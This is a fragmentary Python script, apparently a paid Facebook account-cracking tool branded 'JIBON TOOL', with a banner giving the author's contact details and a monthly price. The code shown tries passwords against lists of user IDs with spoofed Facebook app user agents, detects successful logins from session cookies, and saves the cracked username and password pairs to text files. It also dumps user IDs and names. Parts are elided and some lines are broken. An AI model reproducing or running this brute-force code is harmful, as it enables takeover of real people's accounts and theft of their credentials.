...
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threjibonng, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as jibonabba
from concurrent.futures import ThreadPoolExecutor as jibonabba
from datetime import datetime
from bs4 import BeautifulSoup
...
N = '\033[0m'	# WARNA MATI 
from concurrent.futures import ThreadPoolExecutor as QjibonRMahar
...
def main():
    ...
    print('\033[1;32m└────────────────────────────────────────────┘')
    print('')
    jibon = input('\033[1;37m[+] \033[1;32mCHOOSE OPTION : ')
    if jibon in ('1', '01'):
        __crack__().plerr()
    if jibon in ('2', '02'):
    ...
    if jibon in ('0', '00'):
        exit('THANKS FOR USING JIBON  TOOL')  
    else:
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mjibon\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			try:
				jibonagents = random.choice(liners)
			except (KeyError, IOError):
				jibonagents  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mjibon-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;30mjibon-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mjibon\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[jibon-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('jibon_Cp.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;91m[jibon-CP] %s | %s%s      ' % (user,pw,tahun(user)))
...
def publiccrack():
    ...
    os.system('clear')
    print(banner)
    os.system('rm -rf .jibon1.txt')
    os.system('rm -rf .jibon2.txt')
    ...
    print(50*"\033[1;97m_")
    _jibon__ = input('\033[1;37m[+] \033[1;32mCHOOSE OPTION : ')
    if _jibon__ in ('1', '01'):
        __cracking__().plerr()
    if _jibon__ in ('0', '00'):
...
def create_file():
    ...
    for links in range(ask_link):
        completed +=1
        li = ('1')
        os.system('cat .jibon1.txt | grep '+li+' >> .jibon2.txt')
    ...
    os.system('clear')
    lines = open('.jibon2.txt', 'r').readlines()
    print(banner)
        ...
        try:
            ...
            for inayat in rgq['data']:
                ...
                try:
                    ...
                    last_name = 'Khan'
                idsave.write(uids+'|'+first_name+' '+last_name+'\n')
            print('\033[1;97m [\033[1;32mjibon\033[1;37m] \033[1;36mSUCCESSFULL DUMP FROM\033[1;37m '+ids)
            idsave.close()
    ...
    version()
if not os.path.exists(".jibonwork.txt"):
	open(".jibonwork.txt", 'w').close()
class load:
    def __init__(self):
        _ = ''
        __ = int('30')
...
\033[1;32m┌────────────────────────────────────────────────┐
\033[1;32m│\033[1;31m➣\033[1;37m AUTHOR  \033[1;31m:\033[1;32m MR-jibon       │\033[1;37m• \033[1;36mTHIS TOOL IS PAID \033[1;37m•\033[1;32m │
\033[1;32m│\033[1;31m➣\033[1;37m FACEBOOK\033[1;31m:\033[1;32m Md Jibon Islam   │\033[1;37m• \033[1;36mPER MONTH PACKAGE \033[1;37m• \033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m WHATSAPP\033[1;31m:\033[1;32m 01865544636│\033[1;32m──────────────────────\033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m YOUTUBE \033[1;31m:\033[1;32m MRX JIBON BRO │\033[1;37m  • \033[1;36mPRICE \033[1;31m= \033[1;36m300RS \033[1;37m•   \033[1;32m│
\033[1;32m└────────────────────────────────────────────────┘
